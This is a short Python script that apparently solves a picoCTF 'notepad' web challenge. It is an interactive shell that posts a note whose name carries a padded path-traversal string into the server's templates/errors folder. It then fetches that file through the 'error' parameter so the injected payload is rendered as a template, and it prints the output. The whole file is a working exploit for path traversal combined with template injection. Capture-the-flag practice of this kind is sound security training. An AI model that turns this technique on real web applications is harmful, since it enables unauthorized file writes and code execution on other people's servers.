import re
import os
import requests
import html
from cmd import Cmd
from urllib.parse import urlparse
from pathlib import Path

BASE_URL = "https://notepad.mars.picoctf.net"
START_MARKER = "###START###"
END_MARKER = "###END###"


class MyPrompt(Cmd):

    def __init__(self):
        Cmd.__init__(self)
        self.marker_regex = re.compile(f"{START_MARKER}(.*){END_MARKER}")

    def do_exit(self, inp):
        return True

    def do_send(self, data):
        split_data = data.split(" ")
        payload = split_data.pop(0)
        params = "&" + split_data.pop(0) if split_data else ""

        file_url = "..\\templates\\errors\\".ljust(128, 'a')

        data = {
            "content": f"{file_url}\n{START_MARKER}{payload}{END_MARKER}"
        }
        r = requests.post(f"{BASE_URL}/new", data=data)

        if "?error=" in r.url:
            print(f"Error: Redirected to {r.url}")
            return

        new_file_name = Path(urlparse(r.url).path).stem

        r = requests.get(f"{BASE_URL}?error={new_file_name}{params}")
        match = self.marker_regex.search(r.text)
        print(html.unescape(match.group(1)))


MyPrompt().cmdloop()
